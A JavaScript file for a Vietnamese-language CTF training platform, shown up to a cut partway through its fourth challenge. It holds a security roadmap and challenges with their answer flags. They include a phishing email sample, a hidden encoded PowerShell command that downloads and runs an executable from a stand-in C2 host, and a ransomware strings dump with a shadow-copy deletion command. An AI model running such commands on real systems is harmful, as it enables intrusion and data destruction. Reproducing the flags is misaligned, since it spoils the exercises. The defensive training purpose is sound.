/**
 * CTF (Capture The Flag / Packet) Challenge & Cyber Academy Engine
 * Comprehensive Theory-to-Practice Training Roadmap covering all 7 IT Infrastructure Domains + CCNA
 * Interactive Multi-Tab Workbench (Theory -> Sandbox -> Terminal -> Defense)
 */
class CTFEngine {
    constructor() {
        this.activeView = 'roadmap'; // 'roadmap' | 'arena'
        this.activeWorkbenchTab = 'theory'; // 'theory' | 'sandbox' | 'terminal' | 'defense'
        this.currentDomainFilter = 'all';
        this.activeChallengeIndex = 0;
        this.solvedFlags = new Set(JSON.parse(localStorage.getItem('mmt_ctf_solved') || '[]'));

        // =========================================================================
        // 7 IT INFRASTRUCTURE DOMAINS + CCNA ARCHITECTURAL ROADMAP
        // =========================================================================
        this.roadmapLayers = [
            {
                id: "user",
                layerNum: "TẦNG 1",
                domain: "user",
                title: "Vùng Người Dùng (User Domain)",
                subtitle: "Lớp Con Người • Human Element & Social Engineering",
                icon: "👤",
                color: "rose",
                overview: "Vùng người dùng bao gồm toàn bộ nhân viên, quản lý, nhà thầu và các cá nhân có quyền truy cập vào hệ thống công nghệ thông tin. Đây được coi là mắt xích yếu nhất trong chuỗi bảo mật vì con người dễ bị đánh lừa qua thao túng tâm lý.",
                weaknesses: "Thiếu ý thức bảo mật, dễ bị thao túng tâm lý (tò mò, sợ hãi, khẩn cấp), nhân viên bất mãn, vi phạm chính sách nội quy, đặt mật khẩu yếu hoặc cắm thiết bị lưu trữ lạ.",
                attacks: [
                    "Kỹ nghệ xã hội (Social Engineering): Phishing, Spear Phishing (mạo danh CEO), Vishing, Pretexting, Quid pro quo.",
                    "Bẫy vật lý (Baiting): Rải USB lạ chứa mã độc tại sảnh/bãi đỗ xe dụ nhân viên cắm vào máy trạm.",
                    "Mối đe dọa nội bộ (Insider Threat): Nhân viên cố tình bán dữ liệu, trộm cắp bí mật hoặc phá hoại cơ sở hạ tầng."
                ],
                mitre: "T1566 (Phishing), T1204 (User Execution), T1059.001 (PowerShell), T1200 (Hardware Additions / Baiting)",
                defense: "Triển khai đào tạo nhận thức an ninh mạng (Security Awareness Training - SAT) định kỳ; bắt buộc triển khai SPF/DKIM/DMARC (chính sách p=reject) trên Email Gateway; khóa quyền tự động thực thi USB (Disable AutoRun/GPO); áp dụng nguyên tắc kiểm soát quyền truy cập tối thiểu (PoLP).",
                labIds: [1, 2]
            },
            {
                id: "workstation",
                layerNum: "TẦNG 2",
                domain: "workstation",
                title: "Vùng Máy Trạm (Workstation Domain)",
                subtitle: "Lớp Thiết Bị Đầu Cuối • Endpoint & Host Security",
                icon: "💻",
                color: "amber",
                overview: "Vùng máy trạm bao gồm máy tính xách tay, máy tính để bàn, thiết bị di động của người dùng kết nối vào hệ thống. Đây là nơi tiếp xúc trực tiếp giữa con người và mạng lưới doanh nghiệp.",
                weaknesses: "Chưa cập nhật bản vá hệ điều hành (OS Patching), lỗ hổng phần mềm trình duyệt/Office, phân quyền người dùng lỏng lẻo (quyền Local Admin tràn lan), thiết bị ngoại vi không kiểm soát.",
                attacks: [
                    "Mã độc (Malware): Ransomware (WannaCry tống tiền), Trojan, Spyware đánh cắp thông tin, Keylogger, Rootkit ngầm.",
                    "Drive-by Download: Tự động tải và thực thi mã độc khi nạn nhân duyệt web độc hại qua lỗ hổng browser.",
                    "BadUSB: Thiết bị USB giả lập bàn phím Human Interface Device (HID) để gõ lệnh ngầm với tốc độ cao.",
                    "Leo thang đặc quyền cục bộ (Local Privilege Escalation): Khai thác file mang SUID trên Linux (GTFOBins) hoặc lỗ hổng UAC/Token trên Windows."
                ],
                mitre: "T1486 (Data Encrypted for Impact), T1548.001 (Setuid and Setgid), T1055 (Process Injection), T1189 (Drive-by Compromise)",
                defense: "Triển khai giải pháp EDR (Endpoint Detection and Response) theo dõi hành vi tiến trình; bật cơ chế Application Whitelisting (AppLocker); thu hồi quyền Administrator cục bộ của người dùng; định kỳ rà soát các file nhị phân mang cờ SUID/SGID; bật BitLocker mã hóa toàn bộ ổ đĩa.",
                labIds: [3, 4]
            },
            {
                id: "lan",
                layerNum: "TẦNG 3",
                domain: "lan",
                title: "Vùng Mạng LAN (LAN Domain)",
                subtitle: "Lớp Mạng Nội Bộ • Layer 2 Switching & WLAN Security",
                icon: "🏢",
                color: "cyan",
                overview: "Vùng mạng cục bộ bao gồm toàn bộ thiết bị chuyển mạch (Switch), bộ định tuyến nội bộ, các điểm truy cập Wi-Fi (Access Point) và hệ thống cáp mạng kết nối các máy trạm văn phòng.",
                weaknesses: "Bản chất tin cậy mặc định của giao thức mạng Layer 2, sóng Wi-Fi phát tán tự do ngoài tầm kiểm soát vật lý, các giao thức phân giải không xác thực (ARP, NetBIOS, LLMNR).",
                attacks: [
                    "Tấn công trung gian (MITM): ARP Spoofing / Poisoning làm sai lệch bảng ARP cache của nạn nhân và Gateway.",
                    "Nghe lén dữ liệu (Sniffing): Bắt giữ lưu lượng chưa mã hóa, thu thập NetNTLMv2 hash qua Responder.",
                    "Tấn công mạng không dây WLAN: Dựng trạm phát sóng Wi-Fi giả mạo (Evil Twin / Rogue AP) hạ cấp bảo mật xuống OPEN; bẻ khóa 4-way handshake WPA2.",
                    "Di chuyển ngang (Lateral Movement): Pass-the-Hash, MAC Flooding làm tràn bảng CAM ép Switch biến thành Hub để nghe lén toàn mạng."
                ],
                mitre: "T1557.002 (Arp Spoofing), T1040 (Network Sniffing), T1465 (Rogue Wi-Fi AP), T1550.002 (Pass the Hash)",
                defense: "Bật tính năng Dynamic ARP Inspection (DAI) kết hợp DHCP Snooping trên toàn bộ Switch nội bộ; cấu hình Port Security giới hạn số lượng MAC trên cổng; áp dụng chuẩn 802.1X (WPA2/WPA3-Enterprise) xác thực người dùng qua máy chủ RADIUS; vô hiệu hóa triệt để giao thức LLMNR và NetBIOS-NS.",
                labIds: [5, 6]
            },
            {
                id: "lan-to-wan",
                layerNum: "TẦNG 4",
                domain: "lan-to-wan",
                title: "Vùng LAN-to-WAN (LAN-to-WAN Domain)",
                subtitle: "Lớp Biên Giới Phân Vùng • Perimeter Firewall & DMZ",
                icon: "🚪",
                color: "blue",
                overview: "Vùng chuyển tiếp biên giới phân cách giữa mạng nội bộ an toàn và mạng Internet công cộng không tin cậy. Nơi đây đặt các thiết bị định tuyến biên (Edge Router), Tường lửa (Firewall) và phân vùng DMZ (Demilitarized Zone).",
                weaknesses: "Thiết bị biên đối diện trực tiếp với luồng tấn công từ Internet; firmware cũ dính lỗ hổng đã công bố (CVE); cấu hình Access Control List (ACL) và tường lửa lỏng lẻo hoặc sai sót.",
                attacks: [
                    "Trinh sát & Rà quét (Recon & Port Scanning): Dùng Nmap quét toàn bộ cổng mở và banner grabbing để định danh chính xác phiên bản dịch vụ.",
                    "Khai thác thiết bị biên: Tấn công lỗ hổng firmware trên Router, VPN Gateway, hoặc cửa hậu backdoor dịch vụ (vsftpd 2.3.4 CVE-2011-2523).",
                    "Vượt tường lửa (Firewall Evasion): Kỹ thuật phân mảnh gói tin IP (Fragmentation RFC 791) bằng Scapy đẩy cổng L4 qua fragment số 2 bypass bộ lọc ACL stateless; kỹ thuật giả mạo IP (IP Spoofing)."
                ],
                mitre: "T1595 (Active Scanning), T1190 (Exploit Public-Facing App), T1027 (Obfuscated/Fragmented Files or Information)",
                defense: "Triển khai Tường lửa thế hệ mới (Next-Generation Firewall - NGFW) có khả năng Stateful Packet Inspection và Reassembly; định kỳ cập nhật Firmware thiết bị biên; cấu hình nguyên tắc ngầm định chặn tất cả (Default Deny All); triển khai IPS/IDS (Suricata, Snort) giám sát bất thường.",
                labIds: [7, 8]
            },
            {
                id: "wan",
                layerNum: "TẦNG 5",
                domain: "wan",
                title: "Vùng Mạng WAN (WAN Domain)",
                subtitle: "Lớp Mạng Diện Rộng • Global Internet & Core Routing",
                icon: "🌍",
                color: "indigo",
                overview: "Mạng diện rộng kết nối các chi nhánh doanh nghiệp qua các nhà cung cấp dịch vụ Internet (ISP) và mạng toàn cầu Internet. Dữ liệu truyền đi xa trên các đường truyền công cộng.",
                weaknesses: "Môi trường mở hoàn toàn, không có sự kiểm soát hạ tầng mạng của riêng mình, dữ liệu truyền xa dễ bị nghe lén nếu không mã hóa, các dịch vụ lõi Internet như DNS/BGP dễ bị làm quá tải hoặc chuyển hướng.",
                attacks: [
                    "Từ chối dịch vụ phân tán (DDoS): SYN Flood làm nghẽn hàng đợi kết nối bán mở, UDP Amplification (DNS/NTP) làm ngập băng thông đường truyền.",
                    "Đầu độc bộ nhớ đệm DNS (DNS Cache Poisoning / Kaminsky Bug): Đoán trúng Transaction ID (TXID) ghi đè bản ghi A chuyển hướng người dùng sang web giả mạo.",
                    "Đánh chặn hạ tầng định tuyến: BGP Route Hijacking quảng bá sai dải IP để chiếm lưu lượng toàn cầu; phát tán thư rác mã độc (Malspam) diện rộng."
                ],
                mitre: "T1498.001 (SYN Flood), T1584.002 (DNS Server Poisoning), T1584.004 (BGP Hijacking), T1071 (Application Layer Protocol)",
                defense: "Kích hoạt cơ chế TCP SYN Cookies trong nhân Linux (net.ipv4.tcp_syncookies = 1); sử dụng mạng phân phối nội dung (CDN) và giải pháp chống DDoS chuyên dụng (Cloudflare, Akamai); triển khai chuẩn DNSSEC bảo vệ toàn vẹn bản ghi DNS; mã hóa toàn bộ dữ liệu qua IPsec / TLS 1.3.",
                labIds: [9, 10]
            },
            {
                id: "remote-access",
                layerNum: "TẦNG 6",
                domain: "remote-access",
                title: "Vùng Truy Nhập Từ Xa (Remote Access Domain)",
                subtitle: "Cổng Kết Nối Từ Xa • VPN, RDP, SSH & Session Security",
                icon: "🔑",
                color: "violet",
                overview: "Bao gồm các cổng kết nối và cơ chế xác thực mở ra Internet cho phép nhân viên làm việc từ xa (Work From Home) truy cập vào tài nguyên nội bộ công ty qua VPN, SSH hoặc RDP.",
                weaknesses: "Các cổng quản trị mở trực tiếp ra ngoài Internet; người dùng sử dụng mật khẩu yếu hoặc tái sử dụng mật khẩu; cơ chế quản lý phiên làm việc (Session/JWT) lỏng lẻo.",
                attacks: [
                    "Tấn công mật khẩu: Rải mật khẩu (Password Spraying) thử 1 mật khẩu phổ biến cho nhiều tài khoản; Brute-force vét cạn bằng THChydra; Credential Stuffing.",
                    "Chiếm đoạt phiên làm việc (Session Hijacking): Giả mạo JSON Web Token (JWT) qua lỗ hổng thuật toán 'none' (CVE-2015-9235) tự cấp quyền admin tối cao.",
                    "Khai thác giao thức từ xa: Khai thác lỗ hổng nghiêm trọng trên cổng RDP (như BlueKeep CVE-2019-0708) hoặc lỗ hổng trên cổng SSL-VPN."
                ],
                mitre: "T1110.003 (Password Spraying), T1078.002 (Domain Accounts), T1553 (Subvert Trust Controls / JWT Forgery)",
                defense: "Bắt buộc xác thực đa yếu tố (MFA / 2FA) cho toàn bộ kết nối VPN và dịch vụ từ xa; cấu hình Fail2ban tự động chặn IP sau 5 lần đăng nhập sai; chuyển đổi sang kiến trúc Zero Trust Network Access (ZTNA); kiểm tra và ký số JWT nghiêm ngặt, từ chối token có thuật toán 'none'.",
                labIds: [11, 12]
            },
            {
                id: "system-app",
                layerNum: "TẦNG 7",
                domain: "system-app",
                title: "Vùng Hệ Thống & Ứng Dụng (System & Application Domain)",
                subtitle: "Lớp Máy Chủ & Dữ Liệu • Web Apps, Databases & Cloud",
                icon: "⚙️",
                color: "emerald",
                overview: "Vùng trung tâm lưu trữ toàn bộ dữ liệu nhạy cảm của doanh nghiệp, máy chủ cơ sở dữ liệu (Database Servers), ứng dụng web, hệ thống ERP và hạ tầng ảo hóa/Cloud.",
                weaknesses: "Lỗi lập trình phần mềm (OWASP Top 10), lập trình viên ghép chuỗi thô trong câu lệnh SQL hoặc lệnh hệ thống, hàm C không kiểm tra giới hạn mảng bộ nhớ (Buffer Overflow).",
                attacks: [
                    "Tấn công ứng dụng Web: SQL Injection (UNION-based) trích xuất dữ liệu và mật khẩu quản trị; Thực thi mã từ xa (Command Injection RCE) qua tính năng kiểm tra mạng.",
                    "Lỗi bộ nhớ: Tràn bộ đệm ngăn xếp (Stack Buffer Overflow) ghi đè con trỏ lệnh EIP chiếm quyền thực thi vi xử lý CPU.",
                    "Tấn công Ảo hóa & Cloud: Thoát máy ảo (VM Escape), cấu hình sai quyền truy cập lưu trữ Cloud (Cloud S3 Misconfiguration)."
                ],
                mitre: "T1190 (Exploit Public-Facing App: SQLi), T1059 (Command and Scripting Interpreter: RCE), T1203 (Exploitation for Client Execution: Buffer Overflow)",
                defense: "Lập trình an toàn với Parameterized Queries (Prepared Statements) triệt tiêu SQL Injection; sử dụng các hàm an toàn và kiểm tra nghiêm ngặt input đầu vào (Whitelisting); bật cơ chế bảo vệ nhị phân ASLR, DEP/NX, Stack Canaries; trang bị Web Application Firewall (WAF).",
                labIds: [13, 14, 15]
            },
            {
                id: "networking",
                layerNum: "TẦNG 0",
                domain: "networking",
                title: "Giao Thức Mạng Nền Tảng (Core Networking & CCNA)",
                subtitle: "Lớp Giao Thức Lõi • TCP/IP, OSI, Routing & Subnetting",
                icon: "🖧",
                color: "teal",
                overview: "Toàn bộ kiến trúc an ninh mạng đều được xây dựng trên nền tảng của các giao thức truyền thông mạng cơ bản: Ethernet L2, IP L3, TCP/UDP L4, OSPF định tuyến và các dịch vụ mạng (DHCP, DNS, API).",
                weaknesses: "Thiếu mã hóa ở tầng ứng dụng cũ (Telnet), hiểu sai về tính toán địa chỉ mạng con (Subnetting Broadcast), cấu hình ACL và định tuyến sai sót dẫn đến rò rỉ thông tin.",
                attacks: [
                    "Đánh chặn mật khẩu dạng rõ (Cleartext Telnet Packet Capture) trên cổng TCP 23.",
                    "Lợi dụng địa chỉ Broadcast Directed để đánh thức hoặc gửi tấn công Smurf DoS.",
                    "Bắt tay 3 bước TCP giả mạo Sequence/Ack Number; Máy chủ DHCP giả mạo hạ độc bảng cấp phát IP.",
                    "Bypass quy tắc ACL của Cisco; Tấn công chi phí Metric của giao thức định tuyến OSPF."
                ],
                mitre: "T1040 (Network Sniffing), T1584 (Rogue DHCP), T1210 (Exploit Network Protocol)",
                defense: "Thay thế hoàn toàn Telnet/FTP bằng SSH/SFTP/TLS; nắm vững nguyên tắc tính toán Subnetting và LPM (Longest Prefix Match); cấu hình chuẩn Extended Access Control Lists (ACL) và bảo mật Switch với DHCP Snooping.",
                labIds: [16, 17, 18, 19, 20, 21, 22, 23]
            }
        ];

        // =========================================================================
        // 23 DETAILED CTF CHALLENGES WITH LAB WORKBENCH METADATA
        // =========================================================================
        this.challenges = [
            // --- DOMAIN 1: USER DOMAIN ---
            {
                id: 1,
                domain: "user",
                domainVi: "1. Vùng Người Dùng (User Domain)",
                title: "Thử Thách 1: Phishing Email Header & Điều Tra Giả Mạo SPF/DKIM",
                category: "Kỹ Nghệ Xã Hội (Social Engineering / Phishing)",
                difficulty: "Dễ",
                points: 100,
                mitre: { tactic: "Initial Access", technique: "T1566.002", name: "Spearphishing Link" },
                description: "Một email khẩn cấp gửi tới Trưởng phòng Tài chính giả mạo CEO yêu cầu duyệt chi tiền gấp vào tài khoản lạ. Đội ngũ SOC đã trích xuất toàn bộ tiêu đề thư RFC 5322 (Email Header). Hãy phân tích các trường Authentication-Results, Received, và liên kết độc hại để xác định kết quả kiểm tra SPF, địa chỉ IP máy chủ gửi và tên miền C2!",
                theory: "Email Phishing khai thác sự tin tưởng hoặc tâm lý hoảng loạn của nạn nhân. Giao thức SMTP nguyên thủy (RFC 821) không có cơ chế xác thực người gửi, cho phép bất kỳ ai cũng có thể giả mạo trường 'From:'. Để chống lại giả mạo, các tiêu chuẩn SPF (Sender Policy Framework - RFC 7208), DKIM (DomainKeys Identified Mail - RFC 6376) và DMARC (RFC 7489) được ra đời để máy chủ nhận kiểm tra xem IP gửi thư có được chủ sở hữu tên miền ủy quyền hay không.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "email-headers",
                    headers: [
                        { field: "Delivered-To", value: "victim_cfo@corp-finance.com" },
                        { field: "Received", value: "from mail.secure-invoicing-gateway.org (194.26.29.112) by mx.google.com" },
                        { field: "Authentication-Results", value: "mx.google.com; spf=softfail; dkim=neutral; dmarc=fail" },
                        { field: "From", value: '"CEO Michael" <ceo@corp-finance.com> (SPOOFED)' },
                        { field: "Reply-To", value: "verify@cloud-invoice-pay.xyz (ATTACKER RELAY)" }
                    ]
                },
                codeSnippet: `Delivered-To: victim_cfo@corp-finance.com
Received: by 2002:a17:906:85c1:: with SMTP id ab12;
        Mon, 17 Nov 2026 09:14:22 -0800 (PST)
Received: from mail.secure-invoicing-gateway.org (mail.secure-invoicing-gateway.org [194.26.29.112])
        by mx.google.com with ESMTP id q12si89012qkj.45
        for <victim_cfo@corp-finance.com>;
Received-SPF: softfail (google.com: domain of transitioning billing@secure-invoicing-gateway.org does not designate 194.26.29.112 as permitted sender) client-ip=194.26.29.112;
Authentication-Results: mx.google.com;
       dkim=neutral (bad sig) header.i=@corp-finance.com;
       spf=softfail (google.com: domain of billing@secure-invoicing-gateway.org) smtp.mailfrom=billing@secure-invoicing-gateway.org;
       dmarc=fail (p=NONE) header.from=corp-finance.com
From: "CEO Michael" <ceo@corp-finance.com>
Reply-To: "Finance Verification" <verify@cloud-invoice-pay.xyz>
To: victim_cfo@corp-finance.com
Subject: [URGENT] Thanh toán hóa đơn nhà cung cấp hạ tầng
Content-Type: text/html; charset="UTF-8"

<p>Vui lòng đối soát và chuyển khoản ngay trước 17h hôm nay tại cổng:</p>
<a href="https://auth.cloud-invoice-pay.xyz/portal/verify?id=99281">Xác nhận chuyển khoản</a>

---
YÊU CẦU:
1. Xác định kết quả kiểm tra SPF ghi nhận trong Authentication-Results (ví dụ: pass, fail, softfail, none).
2. Xác định địa chỉ IPv4 của máy chủ gửi thư thực tế (client-ip).
3. Xác định tên miền C2 lừa đảo trong liên kết xác nhận (Domain trong URL thẻ <a>).
Cú pháp cờ: FLAG{<kết_quả_SPF>_<client_ip>_<tên_miền_c2>}
(Ví dụ mẫu: FLAG{fail_1.2.3.4_example.com})`,
                virtualFiles: {
                    "phish_email.eml": `From: "CEO Michael" <ceo@corp-finance.com>\nReply-To: verify@cloud-invoice-pay.xyz\nReceived-SPF: softfail (client-ip=194.26.29.112)\nLink: https://auth.cloud-invoice-pay.xyz/portal/verify?id=99281`,
                    "soc_alert.txt": `[ALERT 2026-11-17] DMARC Failure detected for sender 194.26.29.112 spoofing ceo@corp-finance.com`
                },
                defense: `1. Cấu hình bản ghi DMARC nghiêm ngặt trong DNS của tổ chức:
v=DMARC1; p=reject; sp=reject; rua=mailto:dmarc-reports@corp-finance.com; pct=100;

2. Triển khai Email Security Gateway (SEG) kiểm tra SPF/DKIM/DMARC tại biên trước khi cho phép vào hòm thư nhân viên.
3. Huấn luyện nhân viên kế toán nguyên tắc xác thực kênh kép (Out-of-band verification) qua điện thoại trước khi duyệt lệnh chuyển tiền bất thường.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>CyberChef</b> / <b>MXToolbox Analyzer</b> / Lệnh <code>grep</code> trên terminal.<br>
            • Có thể dùng lệnh <code>cat phish_email.eml</code> trong tab Terminal bên cạnh!
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Đọc trường <code>Authentication-Results</code> để lấy giá trị kiểm tra SPF.<br>
            - Xem trường <code>client-ip</code> tại chặng <code>Received</code> để nhận diện IP relay của hacker.<br>
            - Đọc hostname trong URL thẻ <code>&lt;a href="..."&gt;</code> để lấy domain lừa đảo.
        </div>
    </div>
</div>`,
                flag: "FLAG{softfail_194.26.29.112_cloud-invoice-pay.xyz}"
            },
            {
                id: 2,
                domain: "user",
                domainVi: "1. Vùng Người Dùng (User Domain)",
                title: "Thử Thách 2: Bẫy Vật Lý USB Baiting & Giải Mã PowerShell Dropper",
                category: "Bẫy Vật Lý (Baiting / USB Drop)",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Execution", technique: "T1059.001", name: "Command and Scripting Interpreter: PowerShell" },
                description: "Nhân viên nhặt được chiếc USB có dán nhãn 'Danh_Sach_Thuong_Tet_2026.pdf.lnk' tại sảnh công ty và cắm vào máy tính. File shortcut kích hoạt tiến trình ngầm powershell.exe với tham số -Enc (EncodedCommand) để tải mã độc vào bộ nhớ. Hãy giải mã payload Base64 UTF-16LE để bóc trần hàm tải file, địa chỉ IP C2 và cổng lắng nghe!",
                theory: "Kỹ thuật USB Baiting dựa trên tính tò mò của con người. Khi cắm USB, thay vì file PDF thông thường, kẻ tấn công tạo một file shortcut (.lnk) giả mạo icon của PDF. Tham số mục tiêu của shortcut gọi PowerShell với các cờ: -NoP (bỏ qua profile cấu hình), -W Hidden (ẩn cửa sổ console), và -Enc (nhận lệnh được mã hóa Base64 Unicode để lách qua các bộ lọc ký tự đặc biệt).",
                sandboxType: "forensics",
                sandboxData: {
                    type: "process-arguments",
                    process: "powershell.exe",
                    encodedArg: "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA2ADYAOgA5ADAAMAAxAC8AYwAyAC4AZQB4AGUAJwAsACAAJwBjADoAXAB0AG1wAFwAdgBpAHIAdQBzAC4AZQB4AGUAJwApAA=="
                },
                codeSnippet: `# Trích xuất đối số dòng lệnh từ Shortcut LNK qua sự kiện Sysmon Event ID 1:
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA2ADYAOgA5ADAAMAAxAC8AYwAyAC4AZQB4AGUAJwAsACAAJwBjADoAXAB0AG1wAFwAdgBpAHIAdQBzAC4AZQB4AGUAJwApAA==

---
YÊU CẦU:
Giải mã chuỗi Base64 UTF-16LE trên để tìm:
1. Tên phương thức được gọi từ đối tượng Net.WebClient (ví dụ: DownloadString, DownloadFile, OpenRead...)
2. Địa chỉ IP của máy chủ C2
3. Cổng (Port) kết nối
Cú pháp cờ: FLAG{<tên_phương_thức>_<IP_C2>_<Port>}
(Ví dụ mẫu: FLAG{DownloadData_10.0.0.1_8080})`,
                virtualFiles: {
                    "dropper.ps1": `SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA2ADYAOgA5ADAAMAAxAC8AYwAyAC4AZQB4AGUAJwAsACAAJwBjADoAXAB0AG1wAFwAdgBpAHIAdQBzAC4AZQB4AGUAJwApAA==`,
                    "sysmon_event.xml": `<EventData><Data Name="CommandLine">powershell.exe -enc SQBF...</Data></EventData>`
                },
                defense: `1. Khóa cổng USB ngoại vi bằng Group Policy Object (GPO) hoặc giải pháp Endpoint DLP (Data Loss Prevention).
2. Kích hoạt tính năng PowerShell Constrained Language Mode và Script Block Logging (Event ID 4104) để bắt giữ mã độc trước khi thực thi.
3. Đào tạo nhân viên quy trình an toàn: tuyệt đối không cắm bất kỳ thiết bị USB lạ vào máy tính cơ quan, bàn giao ngay cho đội ngũ IT/SOC.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Dùng lệnh <code>b64 decode &lt;chuỗi&gt;</code> ngay trong tab Terminal bên cạnh!<br>
            • CyberChef: Recipe <code>From Base64</code> -> <code>Decode text UTF-16LE</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Chuỗi Base64 mã hóa đối số PowerShell là dạng UTF-16LE.<br>
            - Sau khi giải mã, bạn sẽ thấy đối tượng <code>Net.WebClient</code> gọi một hàm tải file về ổ C: từ địa chỉ IP và Port cụ thể.
        </div>
    </div>
</div>`,
                flag: "FLAG{DownloadFile_192.168.100.66_9001}"
            },

            // --- DOMAIN 2: WORKSTATION DOMAIN ---
            {
                id: 3,
                domain: "workstation",
                domainVi: "2. Vùng Máy Trạm (Workstation Domain)",
                title: "Thử Thách 3: Điều Tra Ransomware & Truy Tìm Kill-Switch Domain",
                category: "Mã Độc Máy Trạm (Ransomware Forensics)",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Impact", technique: "T1486", name: "Data Encrypted for Impact" },
                description: "Trạm làm việc của kế toán viên bị tấn công bởi mã độc tống tiền họ WannaCry từ tiến trình tasksche.exe, toàn bộ dữ liệu bị đổi đuôi sang .wncry. Trước khi mã hóa ổ cứng, mã độc luôn gửi request HTTP GET tới một domain sinkhole (Kill-Switch). Phân tích chuỗi nhị phân (strings dump) của tiến trình để tìm domain giải cứu này!",
                theory: "WannaCry lây lan qua giao thức SMB (lỗ hổng EternalBlue MS17-010). Khi khởi chạy, mã nguồn WannaCry có một cơ chế kiểm tra Sandbox: nó gửi HTTP request đến một domain vô nghĩa chưa được đăng ký. Nếu domain này phản hồi (nghĩa là mã độc đang nằm trong môi trường phân tích Sandbox có máy chủ DNS giả lập), nó sẽ tự động hủy tiến trình để tránh bị chuyên gia dịch ngược. Khi nhà nghiên cứu Marcus Hutchins mua lại domain này và kích hoạt nó, WannaCry trên toàn cầu tự động ngừng mã hóa dữ liệu.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "memory-strings",
                    process: "tasksche.exe",
                    pid: 2148
                },
                codeSnippet: `$ strings -a -t x tasksche_dump.dmp | grep -E "http://|reg|crypt"
  10a020  http://schemas.microsoft.com/expression/2006
  10a180  CryptAcquireContextA
  10a240  RegOpenKeyExA (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
  10a3b0  http://www.w3.org/1999/xhtml
  10b050  CryptGenRandom
  10b120  InternetOpenA (User-Agent: Mozilla/4.0)
  10b190  http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
  10b250  CryptEncrypt
  10b310  InternetOpenUrlA
  10b420  http://ocsp.digicert.com
  10b550  RegSetValueExA
  10b680  cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet

---
YÊU CẦU:
Tìm tên miền sinkhole (Kill-Switch) bất thường mà mã độc kết nối tới để kiểm tra trước khi gọi hàm mã hóa CryptEncrypt.
Cú pháp cờ: FLAG{<tên_miền_killswitch>}
(Ví dụ: FLAG{www.example-domain.com})`,
                virtualFiles: {
                    "tasksche_dump.dmp": `http://schemas.microsoft.com/expression/2006\nhttp://www.w3.org/1999/xhtml\nhttp://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\nhttp://ocsp.digicert.com`,
                    "edr_alert.log": `[WARN] EDR flagged rapid file modifications with extension .wncry by PID 2148`
                },
                defense: `1. Cập nhật khẩn cấp bản vá an ninh hệ điều hành (Bản vá bảo mật MS17-010 đối với SMBv1).
2. Tắt hoàn toàn giao thức SMBv1 trên toàn bộ máy trạm và máy chủ Windows bằng lệnh:
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
3. Cấu hình giải pháp EDR ngăn chặn hành vi xóa Volume Shadow Copies (vssadmin.exe Delete Shadows).`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Volatility 3, Sysinternals Strings, lệnh <code>cat tasksche_dump.dmp</code> trong Terminal.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Loại bỏ các domain chuẩn của Microsoft và Digicert.<br>
            - Tìm domain dài bất thường gồm các ký tự ngẫu nhiên nằm cạnh hàm gọi InternetOpenUrlA.
        </div>
    </div>
</div>`,
                flag: "FLAG{www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}"
            },
            {
                id: 4,
                domain: "workstation",
                domainVi: "2. Vùng Máy Trạm (Workstation Domain)",
                title: "Thử Thách 4: Leo Thang Đặc Quyền Linux Qua SUID Bit (GTFOBins)",
                category: "Leo Thang Đặc Quyền (Local Privilege Escalation)",
                difficulty: "Nâng cao",
                points: 200,
                mitre: { tactic: "Privilege Escalation", technique: "T1548.001", name: "Setuid and Setgid" },
